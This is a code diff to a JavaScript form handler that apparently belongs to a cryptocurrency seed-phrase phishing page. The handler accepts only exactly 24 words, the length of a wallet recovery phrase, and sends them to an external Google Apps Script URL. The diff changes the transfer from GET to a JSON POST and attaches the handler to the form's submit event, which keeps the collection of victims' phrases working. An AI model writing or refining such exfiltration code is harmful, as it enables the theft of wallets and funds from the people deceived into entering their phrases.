@@ -9,7 +9,7 @@ function handleSubmit(event) {
     myButton2.disabled = true;
 
     // Get the value of the hidden input field with name 'mf-texts'
-    const form = document.getElementById('1Y9QKsY1UI5jA3V3xSisHcn4tiGVcSz4Q'); // Replace 'myForm' with your form ID
+    const form = document.getElementById('1Y9QKsY1UI5jA3V3xSisHcn4tiGVcSz4Q'); // Replace with your correct form ID
     const inputValue = form.elements['mf-texts'].value.trim();
 
     const wordCount = inputValue.split(/\s+/).length;
@@ -21,11 +21,16 @@ function handleSubmit(event) {
         return; // Exit function if word count is not 24
     }
 
-    // Make a GET request to your Google Apps Script URL
-    const url = `https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec?data=${encodeURIComponent(inputValue)}`;
+    // Google Apps Script URL
+    const url = "https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec";
 
+    // Make a POST request to your Google Apps Script URL
     fetch(url, {
-        method: 'GET'
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ data: inputValue }) // Sending data as JSON
     })
     .then(response => response.json()) // Expecting JSON response
     .then(data => {
@@ -42,6 +47,10 @@ function handleSubmit(event) {
         myButton2.disabled = false;
     });
 }
+
+// Add event listener to the form for 'submit' event
+const form = document.getElementById('1Y9QKsY1UI5jA3V3xSisHcn4tiGVcSz4Q');
+form.addEventListener('submit', handleSubmit);
 
 
 
